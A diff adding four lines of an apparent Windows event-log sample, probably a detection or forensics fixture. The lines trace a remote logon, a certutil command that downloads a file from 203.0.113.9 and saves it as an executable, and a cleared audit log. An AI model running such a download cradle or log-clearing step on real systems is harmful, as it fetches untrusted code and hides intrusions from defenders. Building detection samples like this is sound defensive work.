@@ -1,0 +1,4 @@
+09:38:02 Security-Auditing 4624 jsmith | 10 | 198.51.100.23
+09:41:12 Security-Auditing 4688 C:\Windows\System32\certutil.exe | certutil -urlcache -f http://203.0.113.9/a.txt a.exe
+09:41:12 Sysmon               1 cmd.exe /c certutil -urlcache -f http://203.0.113.9/a.txt a.exe | CORP\jsmith
+09:47:30 Eventlog          1102
